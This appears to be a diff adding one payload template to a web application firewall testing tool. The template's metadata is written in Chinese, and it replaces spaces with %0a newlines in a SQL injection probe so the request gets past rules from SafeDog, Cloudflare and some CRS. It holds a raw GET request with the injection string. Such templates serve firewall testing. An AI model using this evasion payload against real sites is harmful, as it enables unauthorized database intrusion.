@@ -1,0 +1,13 @@
+# @name: 换行符%0a替代空格
+# @tags: get,sqli,whitespace,newline,safedog,cloudflare,id,bypass
+# @color: gold
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: replace_space
+# @intent.replace_from: " "
+# @intent.replace_to: %0a
+# @note: 用换行符 %0a 替代空格作为分隔符，绕过以空格分词的规则（SafeDog、Cloudflare、部分 CRS）。SQLMap space2newline 思路。
+GET /?id=1'%0aand%0a'a'='a HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+
